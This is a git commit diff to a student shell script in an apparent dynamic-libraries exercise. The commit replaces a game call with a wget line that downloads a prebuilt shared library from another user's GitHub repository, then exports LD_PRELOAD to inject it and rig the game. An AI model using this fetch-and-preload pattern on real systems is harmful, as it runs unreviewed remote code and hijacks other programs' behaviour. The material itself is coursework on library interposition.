1982e7dd1cfe37959d72052eef7bb893cac3fa0d
Mercy-Runo <mercyruno37@gmail.com>
2022-10-03 15:06:04 -0700

    task 3 trial

--- 0x18-dynamic_libraries/101-make_me_win.sh
+++ 0x18-dynamic_libraries/101-make_me_win.sh
@@ -1,2 +1,3 @@
 #!/bin/bash
-./gm 9 8 10 24 75 9
+wget -P .. https://raw.githubusercontent.com/monoprosito/holbertonschool-low_level_programming/master/0x18-dynamic_libraries/libgiga.so
+export LD_PRELOAD="$PWD/../libgiga.so"
